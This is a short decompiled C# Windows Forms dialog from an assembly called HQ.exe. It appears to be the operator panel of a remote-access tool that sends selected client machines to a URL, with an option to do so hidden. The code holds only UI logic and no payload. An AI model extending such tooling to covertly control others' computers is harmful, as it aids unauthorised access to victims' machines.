// Decompiled with JetBrains decompiler
// Type: InvokedServer.Forms.FrmVisitWebsite
// Assembly: HQ, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C53BC0E5-A85B-41E9-8105-FC74ED122A9A
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\HQ.exe

using System;
using System.Windows.Forms;
using InvokedServer.Helper;


namespace InvokedServer.Forms
{
	public partial class FrmVisitWebsite : Form
	{
		private readonly int _selectedClients;

		public string Url { get; set; }

		public bool Hidden { get; set; }

		public FrmVisitWebsite(int selected)
		{
			this._selectedClients = selected;
			this.InitializeComponent();
		}

		private void FrmVisitWebsite_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Visit Website", this._selectedClients);
		}

		private void btnVisitWebsite_Click(object sender, EventArgs e)
		{
			this.Url = this.txtURL.Text;
			this.Hidden = this.chkVisitHidden.Checked;
			this.DialogResult = DialogResult.OK;
			this.Close();
		}
	}
}